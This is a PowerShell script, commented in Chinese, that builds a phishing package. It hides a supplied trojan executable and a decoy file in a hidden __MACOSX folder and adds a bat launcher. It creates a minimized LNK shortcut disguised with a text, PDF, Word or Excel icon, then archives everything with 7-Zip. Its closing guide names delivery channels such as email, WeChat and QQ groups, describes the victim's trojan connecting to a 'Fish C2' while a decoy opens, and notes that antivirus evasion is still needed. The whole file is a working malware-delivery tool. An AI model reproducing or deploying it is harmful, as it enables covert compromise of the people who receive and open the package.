# Fish钓鱼投递自动化脚本
# 完整复现文章中的LNK钓鱼流程
# 用法: .\phish.ps1 -ExePath .\stager.exe -DecoyName "CTF题目.txt" -IconType "txt" -OutputName "challenge"

param(
    [Parameter(Mandatory=$true)]
    [string]$ExePath,              # 木马exe路径 (stager.exe 或 fish.exe)
    [string]$DecoyName = "题目.txt", # 诱饵文件名
    [string]$DecoyContent = "",      # 诱饵文件内容 (为空则AI生成/默认模板)
    [string]$IconType = "txt",       # 图标类型: txt / pdf / doc / xls / folder
    [string]$OutputName = "challenge", # 输出压缩包名 (不含扩展名)
    [string]$HiddenDir = "__MACOSX", # 隐藏目录名 (默认macOS风格)
    [string]$SubDir = ".note",       # 子目录名
    [switch]$KeepWorking = $false    # 保留工作目录 (调试用)
)

$ErrorActionPreference = "Stop"

# ============================================
# 第1步: 验证输入
# ============================================
if (-not (Test-Path $ExePath)) {
    Write-Host "[!] 木马文件不存在: $ExePath" -ForegroundColor Red
    exit 1
}

$exeName = Split-Path $ExePath -Leaf
$workDir = Join-Path $env:TEMP "fish_phish_$(Get-Random)"

Write-Host "[+] Fish钓鱼投递工具" -ForegroundColor Cyan
Write-Host "[+] 工作目录: $workDir"

# ============================================
# 第2步: 创建目录结构
# ============================================
Write-Host "[+] 创建目录结构..."

$hiddenPath = Join-Path $workDir $HiddenDir
$subPath = Join-Path $hiddenPath $SubDir

New-Item -ItemType Directory -Path $subPath -Force | Out-Null

# 复制木马到隐藏目录
Copy-Item $ExePath (Join-Path $subPath $exeName)

# 复制或生成诱饵文件
$decoyPath = Join-Path $subPath $DecoyName
if ($DecoyContent -ne "") {
    Set-Content -Path $decoyPath -Value $DecoyContent -Encoding UTF8
} else {
    # 默认诱饵内容
    $defaultDecoy = @"
这是加密后的flag，请解密：
ZmxhZ3t0aGlzX2lzX2FfZmFrZV9mbGFnfQ==

提示: Base64编码
"@
    Set-Content -Path $decoyPath -Value $defaultDecoy -Encoding UTF8
}

Write-Host "[+] 目录结构:" -ForegroundColor Green
Write-Host "  $OutputName.lnk"
Write-Host "  $HiddenDir\$SubDir\"
Write-Host "    ├── run.bat"
Write-Host "    ├── $DecoyName (诱饵文件)"
Write-Host "    └── $exeName (木马)"

# ============================================
# 第3步: 生成bat脚本
# ============================================
Write-Host "[+] 生成bat启动脚本..."

$batContent = @"
@echo off
start /b "" "$HiddenDir\$SubDir\$exeName"
start notepad "$HiddenDir\$SubDir\$DecoyName"
"@

$batPath = Join-Path $subPath "run.bat"
Set-Content -Path $batPath -Value $batContent -Encoding ASCII

# ============================================
# 第4步: 生成LNK快捷方式 (使用Windows COM对象)
# ============================================
Write-Host "[+] 生成LNK快捷方式..."

$lnkPath = Join-Path $workDir "$OutputName.lnk"

# 使用WScript.Shell COM对象创建真正的LNK文件
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($lnkPath)

# 目标: 通过cmd.exe执行bat脚本
$shortcut.TargetPath = "cmd.exe"
$shortcut.Arguments = "/c start /b `"$HiddenDir\$SubDir\run.bat`""
$shortcut.WindowStyle = 7  # SW_SHOWMINNOACTIVE - 最小化且不激活

# 设置图标 (根据类型选择系统图标)
$iconMap = @{
    "txt"    = "$env:SystemRoot\System32\shell32.dll,70"    # 文本文档图标
    "pdf"    = "$env:SystemRoot\Installer\{AC76BA86-7AD7-1033-7B44-AC0F074E4100}\SC_Reader.exe,0"
    "doc"    = "$env:SystemRoot\Installer\{90160000-000F-0000-0000-0000000FF1CE}\wordicon.exe,0"
    "xls"    = "$env:SystemRoot\Installer\{90160000-000F-0000-0000-0000000FF1CE}\xlicons.exe,0"
    "folder" = "$env:SystemRoot\System32\shell32.dll,3"     # 文件夹图标
}

if (Test-Path ($iconMap[$IconType] -replace ',\d+$','')) {
    $shortcut.IconLocation = $iconMap[$IconType]
} else {
    # fallback到txt图标
    $shortcut.IconLocation = $iconMap["txt"]
}

$shortcut.Description = $DecoyName
$shortcut.Save()

Write-Host "[+] LNK文件已生成: $lnkPath" -ForegroundColor Green
Write-Host "    目标: cmd.exe /c start /b `"$HiddenDir\$SubDir\run.bat`""
Write-Host "    图标: $IconType"

# ============================================
# 第5步: 设置隐藏属性
# ============================================
Write-Host "[+] 设置隐藏属性..."

# 设置__MACOSX目录为隐藏+系统
$hiddenItem = Get-Item $hiddenPath -Force
$hiddenItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System -bor [System.IO.FileAttributes]::Directory

# 设置子目录和内容也为隐藏
Get-ChildItem $hiddenPath -Recurse -Force | ForEach-Object {
    $_.Attributes = $_.Attributes -bor [System.IO.FileAttributes]::Hidden
}

Write-Host "[+] 隐藏属性已设置 (attrib +h +s $HiddenDir)" -ForegroundColor Green

# ============================================
# 第6步: 7-Zip打包
# ============================================
Write-Host "[+] 打包压缩文件..."

$output7z = Join-Path (Get-Location) "$OutputName.7z"
$outputZip = Join-Path (Get-Location) "$OutputName.zip"

# 查找7-zip
$sevenZip = $null
$sevenZipPaths = @(
    "C:\Program Files\7-Zip\7z.exe",
    "C:\Program Files (x86)\7-Zip\7z.exe",
    (Get-Command 7z -ErrorAction SilentlyContinue).Source
)

foreach ($path in $sevenZipPaths) {
    if ($path -and (Test-Path $path)) {
        $sevenZip = $path
        break
    }
}

if ($sevenZip) {
    # 使用7-zip (保留隐藏属性)
    Push-Location $workDir
    & $sevenZip a -r $output7z "." | Out-Null
    Pop-Location
    Write-Host "[+] 7z压缩包已生成: $output7z" -ForegroundColor Green
    Write-Host "    (7z格式保留隐藏文件属性)" -ForegroundColor Yellow
} else {
    # fallback到PowerShell ZIP (注意: 可能丢失隐藏属性)
    Write-Host "[!] 未找到7-Zip, 使用ZIP格式 (注意: 可能丢失隐藏属性)" -ForegroundColor Yellow
    Compress-Archive -Path "$workDir\*" -DestinationPath $outputZip -Force
    Write-Host "[+] ZIP压缩包已生成: $outputZip" -ForegroundColor Green
    Write-Host "[!] 强烈建议安装7-Zip以保留隐藏属性!" -ForegroundColor Red
}

# ============================================
# 第7步: 清理/显示结果
# ============================================
if (-not $KeepWorking) {
    # 删除工作目录
    # 先移除隐藏属性才能删除
    Get-ChildItem $hiddenPath -Recurse -Force | ForEach-Object {
        $_.Attributes = [System.IO.FileAttributes]::Normal
    }
    $hiddenItem.Attributes = [System.IO.FileAttributes]::Normal
    Remove-Item $workDir -Recurse -Force
    Write-Host "[+] 工作目录已清理" -ForegroundColor Green
} else {
    Write-Host "[*] 工作目录保留: $workDir" -ForegroundColor Yellow
}

# ============================================
# 输出投递指引
# ============================================
Write-Host ""
Write-Host "========== 投递指引 ==========" -ForegroundColor Cyan
Write-Host ""
Write-Host "1. 压缩包: $(if($sevenZip){$output7z}else{$outputZip})"
Write-Host "2. 发送方式:"
Write-Host "   - 邮件附件 (压缩包+社工文案)"
Write-Host "   - 微信/钉钉文件传输"
Write-Host "   - U盘/网盘分享"
Write-Host "   - QQ群/技术论坛附件"
Write-Host ""
Write-Host "3. 目标操作流程:"
Write-Host "   收到压缩包 → 解压 → 看到LNK(伪装成$IconType图标)"
Write-Host "   → 双击 → bat后台启动木马 + 打开诱饵文件"
Write-Host "   → 目标在查看诱饵 → 木马已上线Fish C2"
Write-Host ""
Write-Host "4. 注意事项:"
Write-Host "   - 必须确保目标解压后LNK和__MACOSX在同一目录"
Write-Host "   - 7z格式才能保留隐藏属性, ZIP可能失效"
Write-Host "   - 360开扫描会杀, 需要进一步免杀处理"
Write-Host "================================" -ForegroundColor Cyan
